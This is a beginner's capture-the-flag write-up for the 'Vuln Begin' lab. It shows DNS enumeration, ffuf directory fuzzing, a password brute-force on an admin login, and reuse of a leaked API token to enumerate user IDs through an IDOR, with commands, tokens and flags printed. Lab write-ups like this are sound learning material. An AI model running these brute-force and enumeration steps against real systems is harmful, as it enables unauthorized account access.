# Vuln Begin

- Just discovered this challenges on twitter and decided to jump on it.
Plan to get better at real word bug hunting and pentesting.
- Most of the tools i'm using here i've never used and this is my first time doing all this.


### DNS Recon

- Using `dnsrecon` for the first time. This will query the dns server for any public records.
```
dnsrecon -n 8.8.8.8 -d vulnbegin.co.uk

[-] DNSSEC is not configured for vulnbegin.co.uk                                                                    [18/181]
[*]      SOA dns1.stabletransit.com 69.20.95.4                                                                              
[*]      NS dns2.stabletransit.com 65.61.188.4                                                                              
[*]      NS dns1.stabletransit.com 69.20.95.4                                                                               
[-] Could not Resolve MX Records for vulnbegin.co.uk                                                                        
[*]      TXT vulnbegin.co.uk [^FLAG^BED649C4DB2DF265BD29419C13D82117^FLAG^]                                                 
[*] Enumerating SRV Records                                                                                                 
[-] No SRV Records Found for vulnbegin.co.uk                                                                                
[+] 0 Records Found
```

- Sublist3r will query with OSINT to discover domain names and other stuff, some of which may be private and meant for the public.
```
sublist3r -d vulnbegin.co.uk

[-] Total Unique Subdomains Found: 3
www.vulnbegin.co.uk
server.vulnbegin.co.uk
v64hss83.vulnbegin.co.uk
```

- This next one is performing a brute force attack on the domain names and is trying to use the wordlist to try to out the obscure domain names.
```
 dnsrecon -d vulnbegin.co.uk -D /root/wordlists/namelist.txt -t brt 

[*]      A server.vulnbegin.co.uk 67.207.71.104
[*]      A www.vulnbegin.co.uk 67.207.71.104

```


### Content Discovery

- Using ffuf to discover some of the other uris on the website. so we can check them out.
```
ffuf -w /path/to/wordlists/wordlist.txt -u htp://www.website.com/FUZZ

cpadmin                 [Status: 302, Size: 0, Words: 1, Lines: 1]
css                     [Status: 301, Size: 194, Words: 7, Lines: 8]
js                      [Status: 301, Size: 194, Words: 7, Lines: 8]
robots.txt              [Status: 200, Size: 41, Words: 3, Lines: 2]
```

- The error handling on the website is not very good. They tell you which particular part of your login details in incorrectly entered. We found a username that works, now lets try to use a brute force attack to crack the password. Using the new found love ffuf
```
 ffuf -w ~/wordlists/10-million-password-list-top-100.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -mc all 
```
`-mc`: Match all http status codes `all` matches everything.
this will return all `status 200` results whether they were successful logins or not.

```
ffuf -w ../wordlists/10-million-password-list-top-100.txt -X POST -d "usrname=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -mc all -fc 200

```
`-fc`: Filter out status codes, in this case filter out all 200 status codes so we can see the successful logins.

- Logged into the admin account found a flag and bunch of things about apis and a token cookie. We are going to do some content-discovery with this token and see what we can find.
```
ffuf -w ../wordlists/common.txt -b "token: 2eff535bd75e77b62c70ba1e4dcb2873"  -u http://vulnbegin.co.uk/cpadmin/FUZZ
```
i found one route on from the admin account that gave me a flag and `X-Token`. Lemme do some quick googling, find out what that is all about.
```
{"api_key":"X-Token: 492E64385D3779BC5F040E2B19D67742","flag":"[^FLAG^F6A691584431F9F2C29A3A2DE85A2210^FLAG^]"}
```
Ohh its an api-key, also x-token is used for authorization or authenticating users.

- I send a get request with the `x-token` in the headers to the website. And lookout for what i'll see. Since its an api key, i'll be sending the request to the subdomain with that says server. 
```
curl -H "x-token: blah blah blah" http://server.website.co.uk 

{"messaged":"User Authenticated","flag":"[^FLAG^0BDC60CC5E283476E7107C814C18DCCF^FLAG^]"}
```

- I feel like fuzzing this motherfucker to see what it has to offer.
```
ffuf -w ../wordlist/common.txt -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -u http://server.vulnbegin.co.uk/FUZZ -mc all 
```
- I curled the server.vulnbegin on the user route and found a user
```
curl -H "X-Token: 492E64385D3779BC5F040E2B19D67742" http://server.vulnbegin.co.uk/user


{"id":27,"flag":"[^FLAG^7B3A24F3368E71842ED7053CF1E51BB0^FLAG^]","endpoint":"\/user\/27"}
```
I found one new endpoint. `/user`, i curled it and found a flag and also found a `static idor`(just read about this) vulnerability.
I could create a list listing over 10,000 numbers them use it to fuzz the route and look for users i can access.
```
for i in {1..10000};do echo $i >> ../wordlists/1-10000.txt ;done # create a loop of all the possible numbers to create a wordlist.
# i'll use this wordlist to fuzz the possible users i can access and then try accessing them

ffuf -w ../wordlists/1-10000.txt -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -u http://server.vulnbegin.co.uk/user/FUZZ -mc all -fc 404

#results:
5                       [Status: 403, Size: 48, Words: 9, Lines: 1]
27                      [Status: 200, Size: 70, Words: 1, Lines: 1]

```

- I tried curling the first one and from the http status code you'll know there will be some auth/permission issues. Also i already got access to the first one and got a flag, so i did not see the need to do that again.
But doing it again revealed another damning path on the user side. I tried and it on the `5` user and it didnt request any auth, gave me a flag too.